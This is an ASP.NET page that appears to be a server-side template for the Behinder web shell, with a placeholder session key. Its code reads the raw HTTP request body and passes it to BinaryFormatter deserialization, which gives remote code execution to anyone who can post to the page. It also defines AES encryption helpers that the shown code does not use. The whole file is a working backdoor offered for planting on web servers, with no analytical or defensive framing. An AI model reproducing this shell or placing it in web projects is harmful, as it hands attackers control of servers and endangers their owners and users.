<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.Serialization.Formatters.Binary" %>
<%@ Import Namespace="System.IO" %>


<script runat="server">
    private  byte[] Decrypt(byte[] data)
    {
        string key="$$BEHINDER_SESSION_KEY$$";
        data = Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(data));
        System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged();
        aes.Mode = System.Security.Cryptography.CipherMode.ECB;
        aes.Key = Encoding.UTF8.GetBytes(key);
        aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
        return aes.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
    }
    private  byte[] Encrypt(byte[] data)
    {
        string key = "$$BEHINDER_SESSION_KEY$$";
        System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged();
        aes.Mode = System.Security.Cryptography.CipherMode.ECB;
        aes.Key = Encoding.UTF8.GetBytes(key);
        aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
        return System.Text.Encoding.UTF8.GetBytes(Convert.ToBase64String(aes.CreateEncryptor().TransformFinalBlock(data, 0, data.Length)));
    }
</script>

<%
    byte[] data = Request.BinaryRead(Request.ContentLength);
    BinaryFormatter formatter = new BinaryFormatter();
    MemoryStream memoryStream = new MemoryStream(data);
    object obj = formatter.Deserialize(memoryStream);
    obj.Equals(this);
%>
